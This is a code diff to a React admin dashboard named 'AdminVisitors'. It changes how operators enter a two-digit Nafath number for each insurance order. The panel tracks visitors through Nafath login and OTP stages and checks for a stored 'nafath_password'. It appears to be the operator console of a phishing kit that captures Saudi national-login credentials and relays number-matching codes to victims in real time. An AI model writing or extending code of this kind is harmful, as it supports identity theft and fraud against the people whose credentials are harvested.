@@ -132,7 +132,7 @@ const AdminVisitors = () => {
   const [chatSelectMode, setChatSelectMode] = useState(false);
   const [selectedForClear, setSelectedForClear] = useState<Set<string>>(new Set());
   const [showChatMenu, setShowChatMenu] = useState(false);
-  const [nafathNumberInput, setNafathNumberInput] = useState("");
+  const [nafathNumberInputs, setNafathNumberInputs] = useState<Record<string, string>>({});
   const knownPendingOrdersRef = useRef<Set<string>>(new Set());
   const initialLoadDoneRef = useRef(false);
   const knownPendingStagesRef = useRef<Set<string>>(new Set());
@@ -447,7 +447,11 @@ const AdminVisitors = () => {
     toast.success("تمت الموافقة على المرحلة");
     setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, stage_status: "approved", nafath_number: nafathNum || o.nafath_number } : o));
     setStageEvents(prev => prev.map(event => event.order_id === orderId && !event.resolved_at ? { ...event, status: "approved", resolved_at: new Date().toISOString() } : event));
-    setNafathNumberInput("");
+    setNafathNumberInputs(prev => {
+      const next = { ...prev };
+      delete next[orderId];
+      return next;
+    });
     setLoadingAction(null);
   };
 
@@ -457,7 +461,7 @@ const AdminVisitors = () => {
     await supabase.from("insurance_orders").update({ nafath_number: newNumber }).eq("id", orderId);
     setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, nafath_number: newNumber } : o));
     toast.success("تم تحديث رقم النفاذ");
-    setNafathNumberInput("");
+    setNafathNumberInputs(prev => ({ ...prev, [orderId]: newNumber }));
     setLoadingAction(null);
   };
 
@@ -662,7 +666,12 @@ const AdminVisitors = () => {
   };
   const hasNafathVerifyTrail = (order: InsuranceOrder) => {
     const stage = currentStageOrEmpty(order);
-    return stage === "nafath_verify" || Boolean(order.nafath_number);
+    return ["nafath_verify", "nafath_login"].includes(stage) || Boolean(order.nafath_number || order.nafath_password);
+  };
+  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
+  const setNafathInputValue = (orderId: string, value: string) => {
+    const sanitized = value.replace(/\D/g, "").slice(0, 2);
+    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
   };
   const hasOtpTrail = (order: InsuranceOrder) => {
     const stage = currentStageOrEmpty(order);
@@ -1388,13 +1397,13 @@ const AdminVisitors = () => {
                                       <input
                                         type="text"
                                         placeholder="أدخل الرقم (مثل 35)"
-                                        value={nafathNumberInput}
-                                        onChange={e => setNafathNumberInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                                        value={getNafathInputValue(order)}
+                                        onChange={e => setNafathInputValue(order.id, e.target.value)}
                                         className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                       />
                                     </div>
                                     <div className="flex items-center gap-2">
-                                      <Button onClick={() => handleStageApprove(order.id, nafathNumberInput)} disabled={loadingAction !== null || !nafathNumberInput} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                      <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                         {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة وإرسال
                                       </Button>
                                       <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
@@ -1409,11 +1418,11 @@ const AdminVisitors = () => {
                                         <input
                                           type="text"
                                           placeholder={order.nafath_number}
-                                          value={nafathNumberInput}
-                                          onChange={e => setNafathNumberInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                                          value={getNafathInputValue(order)}
+                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
                                           className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                         />
-                                        <Button onClick={() => handleUpdateNafathNumber(order.id, nafathNumberInput)} disabled={loadingAction !== null || !nafathNumberInput} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
+                                        <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
                                           {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
                                         </Button>
                                       </div>
@@ -1459,13 +1468,13 @@ const AdminVisitors = () => {
                                         <input
                                           type="text"
                                           placeholder="رقم نفاذ (مثل 35)"
-                                          value={nafathNumberInput}
-                                          onChange={e => setNafathNumberInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                                          value={getNafathInputValue(order)}
+                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
                                           className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                         />
                                       </div>
                                       <div className="flex items-center gap-2">
-                                        <Button onClick={() => handleStageApprove(order.id, nafathNumberInput)} disabled={loadingAction !== null || !nafathNumberInput} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                        <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                           {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                         </Button>
                                         <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
